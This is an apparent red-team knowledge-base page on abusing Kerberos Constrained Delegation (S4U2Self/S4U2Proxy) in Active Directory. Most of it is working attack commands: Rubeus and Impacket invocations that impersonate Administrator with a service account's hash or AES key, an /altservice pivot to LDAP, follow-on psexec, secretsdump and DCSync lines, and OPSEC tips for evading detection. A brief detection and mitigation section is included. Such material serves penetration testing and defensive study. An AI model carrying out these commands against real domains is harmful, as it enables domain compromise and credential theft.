---
title: "Attack #16 — Constrained Delegation Abuse (S4U2Proxy)"
description: "Constrained Delegation was designed as a safer alternative to Unconstrained Delegation. Instead of caching every user's TGT, a service configured for…"
category: active-directory
tags: ["active-directory", "kerberos", "delegation", "hashing"]
tools: ["NetExec", "Impacket", "Rubeus", "BloodHound", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #16 — Constrained Delegation Abuse (S4U2Proxy).md"
---
# 🟠 Attack #16 — Constrained Delegation Abuse (S4U2Proxy)

***

## 📖 How It Works

Constrained Delegation was designed as a **safer alternative to Unconstrained Delegation**. Instead of caching every user's TGT, a service configured for Constrained Delegation can only impersonate users to **specific services listed in its `msDS-AllowedToDelegateTo` attribute**. However, if an attacker compromises the constrained delegation account's credentials (password, hash, or keys), they can abuse this by using the **S4U (Service for User) protocol extensions** to impersonate any user — including Domain Admins — to those specific services.

### The S4U Protocol Extensions

| Extension | What It Does | Key Detail |
|---|---|---|
| **S4U2Self** | Service requests a ticket to ITSELF on behalf of another user | Returns a forwardable service ticket for the target user |
| **S4U2Proxy** | Service uses that ticket to request a ticket to a DIFFERENT service | Impersonates the user to the allowed backend service |

### The Full Attack Flow

```
1. Enumerate accounts with msDS-AllowedToDelegateTo set
2. Compromise that account (Kerberoasting, credential theft, etc.)
3. Use S4U2Self to obtain a ticket as Administrator to YOUR service
4. Use S4U2Proxy to exchange it for a ticket to the TARGET service (e.g., CIFS/DC01)
5. Authenticate to the target service as Administrator
6. Full access to the service — if CIFS/LDAP to DC, it's game over
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Compromised delegation account** | Password, NT hash, or AES key of the account with Constrained Delegation |
| **msDS-AllowedToDelegateTo populated** | Must have target SPNs configured |
| **Target user not in Protected Users** | Protected Users and "sensitive" accounts block delegation (unless Bronze Bit is used) |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Rubeus** | Windows | `s4u` command — full S4U2Self+S4U2Proxy flow |
| **Impacket — getST.py** | Linux | `-impersonate` flag for S4U exploitation |
| **PowerView** | Windows | Enumerate constrained delegation accounts |
| **BloodHound** | Both | Visual identification of delegation paths |

***

## 💻 Full Commands

### 🔵 Step 1 — Enumerate Constrained Delegation

```powershell
# ── PowerView ─────────────────────────────────────────────────────────────────
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# ── AD Module ─────────────────────────────────────────────────────────────────
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo |
  Select-Object Name, msDS-AllowedToDelegateTo
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo |
  Select-Object Name, msDS-AllowedToDelegateTo
```

```bash
# ── Impacket ──────────────────────────────────────────────────────────────────
findDelegation.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# ── NetExec ───────────────────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' --delegated-access
```

### 🔴 Rubeus — S4U Attack (Windows)

```powershell
# ── S4U2Self + S4U2Proxy — impersonate Administrator to CIFS ──────────────────
.\Rubeus.exe s4u \
  /user:svc_sql \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /impersonateuser:Administrator \
  /msdsspn:CIFS/DC01.corp.local \
  /ptt

# Flags:
# /user             = Compromised constrained delegation account
# /rc4              = NT hash (can also use /aes256: for stealth)
# /impersonateuser  = User to impersonate (any non-protected user)
# /msdsspn          = Target SPN from msDS-AllowedToDelegateTo
# /ptt              = Inject resulting ticket

# ── With AES key (stealthier) ────────────────────────────────────────────────
.\Rubeus.exe s4u \
  /user:svc_sql \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /impersonateuser:Administrator \
  /msdsspn:CIFS/DC01.corp.local \
  /ptt

# ── Alternate SPN (SPN for a different service on same host) ──────────────────
# If msDS-AllowedToDelegateTo says CIFS/DC01, you can often request
# other services on the same host by changing the SPN prefix:
.\Rubeus.exe s4u \
  /user:svc_sql \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /impersonateuser:Administrator \
  /msdsspn:CIFS/DC01.corp.local \
  /altservice:LDAP/DC01.corp.local \
  /ptt
# /altservice = request ticket for a DIFFERENT service on the same host
# This works because the service name is not integrity-protected in the ticket

# ── Verify and use ───────────────────────────────────────────────────────────
klist
dir \\DC01.corp.local\C$
# If LDAP → lsadump::dcsync /domain:corp.local /user:krbtgt
```

### 🔴 Impacket — getST.py (Linux)

```bash
# ── S4U attack from Linux ─────────────────────────────────────────────────────
getST.py -spn CIFS/DC01.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  corp.local/svc_sql:'ServicePass1'

# ── Using NT hash ─────────────────────────────────────────────────────────────
getST.py -spn CIFS/DC01.corp.local \
  -impersonate Administrator \
  -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -dc-ip 10.10.10.10 \
  corp.local/svc_sql

# ── Using AES key ─────────────────────────────────────────────────────────────
getST.py -spn CIFS/DC01.corp.local \
  -impersonate Administrator \
  -aesKey b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -dc-ip 10.10.10.10 \
  corp.local/svc_sql

# ── Use the resulting ticket ──────────────────────────────────────────────────
export KRB5CCNAME=Administrator@CIFS_DC01.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **The `/altservice` flag is critical** — even if allowed-to-delegate-to only lists CIFS, you can request LDAP, HOST, HTTP, etc. on the same host
- **AES keys > RC4** for avoiding encryption type anomalies
- **Protected Users block delegation** — Administrator is NOT in Protected Users by default, but some hardened environments add them
- **Constrained Delegation without protocol transition** (`Use Kerberos only`) requires the user to have actually authenticated via Kerberos; with protocol transition (`Use any authentication protocol`), S4U2Self works regardless

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log (DC) | S4U2Proxy TGS request — service account requesting TGS for another user to an allowed service |
| **4768** | Security Log (DC) | TGT request for the constrained delegation service account |
| **4624** | Security Log | Network logon as impersonated user from unexpected source |

***

## 🔗 Attack Chain Context

```
[Constrained Delegation] ──→ Impersonate Any User to Allowed Services
         │
         ├──→ 🔑 Kerberoast service account hash → S4U → DA impersonation
         ├──→ 🔄 /altservice → pivot from CIFS to LDAP → DCSync
         ├──→ 🔗 Chain: Kerberoast (#2) → crack hash → S4U → domain compromise
         ├──→ 🆚 Bronze Bit (#18) bypasses "sensitive" account protection
         └──→ 💀 Defeated by: Protected Users group, remove delegation, rotate passwords
```

***

> ✅ **Attack #16 — Constrained Delegation complete.**
